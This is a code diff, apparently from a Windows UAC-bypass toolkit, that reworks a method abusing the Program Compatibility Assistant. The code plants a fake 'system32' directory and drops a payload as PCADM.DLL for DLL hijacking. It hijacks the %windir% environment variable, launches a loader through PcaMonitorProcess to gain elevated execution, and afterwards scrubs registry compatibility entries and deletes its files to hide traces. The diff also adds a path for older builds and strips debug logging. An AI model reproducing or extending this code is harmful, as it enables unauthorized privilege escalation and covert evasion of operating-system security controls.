@@ -1389,14 +1389,16 @@ FARPROC ucmxGetPcaMonitorProcess()
 }
 
 /*
-* ucmxRemoveLoaderEntryFromStore
+* ucmxRemoveLoaderEntryFromRegistry
 *
 * Purpose:
 *
-* Cleanup PCA store.
+* Cleanup registry entries.
 *
 */
-ULONG ucmxRemoveLoaderEntryFromStore(
+ULONG ucmxRemoveLoaderEntryFromRegistry(
+    _In_ HKEY hRootKey,
+    _In_ LPCWSTR lpRegPath,
     _In_ LPCWSTR lpLoaderName
 )
 {
@@ -1407,8 +1409,8 @@ ULONG ucmxRemoveLoaderEntryFromStore(
     WCHAR szValue[MAX_PATH + 1];
 
     do {
-        if (ERROR_SUCCESS != RegOpenKeyEx(HKEY_CURRENT_USER,
-            T_PCA_STORE,
+        if (ERROR_SUCCESS != RegOpenKeyEx(hRootKey,
+            lpRegPath,
             0,
             KEY_READ | KEY_SET_VALUE,
             &hKey))
@@ -1492,8 +1494,8 @@ NTSTATUS ucmPcaMethod(
     _In_ DWORD ProxyDllSize
 )
 {
-    BOOL fEnvSet = FALSE, fDirCreated = FALSE, fLoaderCreated = FALSE;
-    ULONG pcaStatus = 0, seedValue;
+    BOOL fEnvSet = FALSE, fDirCreated = FALSE, fLoaderCreated = FALSE, fUsePca = TRUE;
+    ULONG ulResult = 0, seedValue;
     NTSTATUS MethodResult = STATUS_ACCESS_DENIED, ntStatus;
     HRESULT hr_init;
     SIZE_T cchDirName = 0, nLen, viewSize = PAGE_SIZE;
@@ -1501,7 +1503,6 @@ NTSTATUS ucmPcaMethod(
     pfnPcaMonitorProcess PcaMonitorProcess = NULL;
 
     HANDLE hSharedSection = NULL, hSharedEvent = NULL;
-    PVOID pvSharedSection = NULL;
 
     STARTUPINFO startupInfo;
     PROCESS_INFORMATION processInfo;
@@ -1528,6 +1529,9 @@ NTSTATUS ucmPcaMethod(
     RtlSecureZeroMemory(&startupInfo, sizeof(startupInfo));
 
     do {
+        if (g_ctx->dwBuildNumber < 9200)
+            fUsePca = FALSE;
+
         RtlSecureZeroMemory(&szLoaderName, sizeof(szLoaderName));
 
         seedValue = ~GetTickCount();
@@ -1565,8 +1569,6 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] Shared section create OK\r\n");
-
         ntStatus = NtMapViewOfSection(
             hSharedSection,
             NtCurrentProcess(),
@@ -1584,8 +1586,6 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] NtMapViewOfSection success\r\n");
-
         //
         // Create completion event.
         //
@@ -1601,18 +1601,24 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] SharedEvent create OK\r\n");
+        if (fUsePca) {
 
-        //
-        // Query PCACLI!PcaMonitorProcess.
-        //
-        PcaMonitorProcess = (pfnPcaMonitorProcess)ucmxGetPcaMonitorProcess();
-        if (PcaMonitorProcess == NULL) {
-            OutputDebugString(L"[UCM] ucmxGetPcaMonitorProcess failed\r\n");
-            break;
+            //
+            // Query PCACLI!PcaMonitorProcess.
+            //
+            PcaMonitorProcess = (pfnPcaMonitorProcess)ucmxGetPcaMonitorProcess();
+            if (PcaMonitorProcess == NULL) {
+                OutputDebugString(L"[UCM] ucmxGetPcaMonitorProcess failed\r\n");
+                break;
+            }
+
         }
+        else {
 
-        OutputDebugString(L"[UCM] ucmxGetPcaMonitorProcess success\r\n");
+            //FIXME
+            //Execute PcaSvc
+
+        }
 
         //
         // Stop WDI\ResolutionHost task.
@@ -1625,12 +1631,10 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] supStopTaskByName success\r\n");
-
         //
-        // Create destination dir "system32" in %temp%
+        // Create destination dir "system32"
         //
-        _strcpy(szBuffer, g_ctx->szTempDirectory);
+        _strcpy(szBuffer, g_ctx->szCurrentDirectory);
         _strcat(szBuffer, SYSTEM32_DIR_NAME);
         cchDirName = _strlen(szBuffer);
         if (!CreateDirectory(szBuffer, NULL)) {
@@ -1640,12 +1644,10 @@ NTSTATUS ucmPcaMethod(
             }
         }
 
-        OutputDebugString(L"[UCM] Fake system32 dir created OK\r\n");
-
         fDirCreated = TRUE;
 
         //
-        // Convert payload to dll for dll hijack.
+        // Convert payload for dll hijack.
         //
         if (!supReplaceDllEntryPoint(
             ProxyDll,
@@ -1657,8 +1659,6 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCADLL) success\r\n");
-
         //
         // Drop payload to the fake system32 dir as PCADM.DLL.
         //
@@ -1669,8 +1669,6 @@ NTSTATUS ucmPcaMethod(
             OutputDebugString(L"[UCM] supWriteBufferToFile(PCADLL) failed\r\n");
             break;
         }
-
-        OutputDebugString(L"[UCM] supWriteBufferToFile(PCADLL) success\r\n");
 
         //
         // Convert dll to exe to be loader task.
@@ -1685,12 +1683,10 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] supReplaceDllEntryPoint(PCAEXE) success\r\n");
-
         //
         // Drop loader to the temp dir.
         //
-        _strcpy(szLoader, g_ctx->szTempDirectory);
+        _strcpy(szLoader, g_ctx->szCurrentDirectory);
         _strcat(szLoader, szLoaderName);
         fLoaderCreated = supWriteBufferToFile(szLoader, ProxyDll, ProxyDllSize);
         if (!fLoaderCreated) {
@@ -1698,7 +1694,10 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] supWriteBufferToFile(PCAEXE) success\r\n");
+        if (!supSetExternalManifestForFile(szLoader, FALSE)) {
+            OutputDebugString(L"[UCM] Could not set external manifest for loader\r\n");
+            break;
+        }
 
         //
         // Remember loader name
@@ -1708,7 +1707,7 @@ NTSTATUS ucmPcaMethod(
         //
         // Set new %windir% environment variable.
         //
-        _strcpy(szEnvVar, g_ctx->szTempDirectory);
+        _strcpy(szEnvVar, g_ctx->szCurrentDirectory);
         nLen = _strlen(szEnvVar);
         if (szEnvVar[nLen - 1] == L'\\') {
             szEnvVar[nLen - 1] = 0;
@@ -1720,13 +1719,11 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] supSetEnvVariable(WINDIR) success\r\n");
-
 
         //
         // Set loader command line.
         //
-        szLoaderCmdLine[0] = TEXT('1');
+        szLoaderCmdLine[0] = (fUsePca) ? TEXT('1') : TEXT('3');
         szLoaderCmdLine[1] = 0;
 
         //
@@ -1750,32 +1747,45 @@ NTSTATUS ucmPcaMethod(
             break;
         }
 
-        OutputDebugString(L"[UCM] CreateProcess(Loader) success\r\n");
+        if (fUsePca) {
 
-        //
-        // Call PCA and resume loader uppon success.
-        //
-        pcaStatus = PcaMonitorProcess(
-            processInfo.hProcess,
-            1,
-            szLoader,
-            szLoaderCmdLine,
-            szEnvVar,
-            PCA_MONITOR_PROCESS_NORMAL);
+            //
+            // Call PCA and resume loader uppon success.
+            //
+            ulResult = PcaMonitorProcess(
+                processInfo.hProcess,
+                1,
+                szLoader,
+                szLoaderCmdLine,
+                szEnvVar,
+                PCA_MONITOR_PROCESS_NORMAL);
 
-        if (pcaStatus != 0) {
-            OutputDebugString(L"[UCM] PcaMonitorProcess(Loader) failed\r\n");
-            TerminateProcess(processInfo.hProcess, 0);
-            break;
+            if (ulResult != 0) {
+                OutputDebugString(L"[UCM] PcaMonitorProcess(Loader) failed\r\n");
+                TerminateProcess(processInfo.hProcess, 0);
+                break;
+            }
+
         }
-
-        OutputDebugString(L"[UCM] PcaMonitorProcess(Loader) success\r\n");
 
         ResumeThread(processInfo.hThread);
 
         OutputDebugString(L"[UCM] Waiting for process started\r\n");
         WaitForSingleObject(processInfo.hProcess, INFINITE);
+
         OutputDebugString(L"[UCM] Waiting for process finished\r\n");
+
+        if (fUsePca) {
+            GetExitCodeProcess(processInfo.hProcess, &ulResult);
+
+            _strcpy(szEnvVar, TEXT("[UCM] Loader exit code: "));
+            ultostr(ulResult, _strend(szEnvVar));
+            _strcat(szEnvVar, TEXT("\r\n"));
+            OutputDebugString(szEnvVar);
+
+            if (ulResult != 0)
+                break;
+        }
 
         OutputDebugString(L"[UCM] Waiting for shared event start\r\n");
         WaitForSingleObject(hSharedEvent, 20 * 1000);
@@ -1787,12 +1797,8 @@ NTSTATUS ucmPcaMethod(
             OutputDebugString(L"[UCM] Loader failed\r\n");
             supSetGlobalCompletionEvent();
         } 
-        else
-            OutputDebugString(L"[UCM] Loader task completed\r\n");
 
     } while (FALSE);
-
-    OutputDebugString(L"[UCM] Cleanup\r\n");
 
     Sleep(2500);
 
@@ -1807,7 +1813,7 @@ NTSTATUS ucmPcaMethod(
     if (hSharedEvent)
         NtClose(hSharedEvent);
 
-    if (pvSharedSection)
+    if (pvLoaderBlock)
         NtUnmapViewOfSection(NtCurrentProcess(), (PVOID)pvLoaderBlock);
 
     if (hSharedSection)
@@ -1816,13 +1822,31 @@ NTSTATUS ucmPcaMethod(
     if (fEnvSet)
         supSetEnvVariable(TRUE, NULL, T_WINDIR, NULL);
 
-    if (ucmxRemoveLoaderEntryFromStore(szLoaderName) > 0)
-        OutputDebugString(L"[UCM] Cleanup, store entry removed");
+    if (fUsePca) {
+        if (ucmxRemoveLoaderEntryFromRegistry(
+            HKEY_CURRENT_USER,
+            T_PCA_STORE,
+            szLoaderName) > 0)
+        {
+            OutputDebugString(L"[UCM] Cleanup, store entry removed");
+        }
+    }
+    else {
+        ucmxRemoveLoaderEntryFromRegistry(
+            HKEY_LOCAL_MACHINE, 
+            T_APPCOMPAT_LAYERS, 
+            szLoaderName);
+        
+        ucmxRemoveLoaderEntryFromRegistry(
+            HKEY_CURRENT_USER, 
+            T_PCA_PERSISTED, 
+            szLoaderName);
+    }
 
     if (fLoaderCreated) {
         OutputDebugString(L"[UCM] Cleanup, loader file");
         OutputDebugString(szLoader);
-
+        supSetExternalManifestForFile(szLoader, TRUE);
         DeleteFile(szLoader);
     }
 
